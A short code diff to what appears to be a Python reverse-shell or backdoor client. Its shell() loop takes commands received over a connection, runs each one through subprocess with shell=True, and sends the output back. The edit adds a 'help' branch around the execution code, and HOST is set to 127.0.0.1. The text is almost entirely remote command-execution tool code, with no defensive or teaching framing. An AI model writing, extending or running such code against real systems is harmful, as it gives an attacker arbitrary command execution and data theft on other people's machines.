@@ -28,11 +28,15 @@ def shell():
         if command == 'exit': # Exit the loop if the exit message is received 
             break
 
-        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        elif command == 'help':
+            pass
 
-        result = execute.stdout.read() + execute.stderr.read()
-        result = result.decode()
-        send(result)
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            send(result)
 
 # Connection data
 HOST = '127.0.0.1'
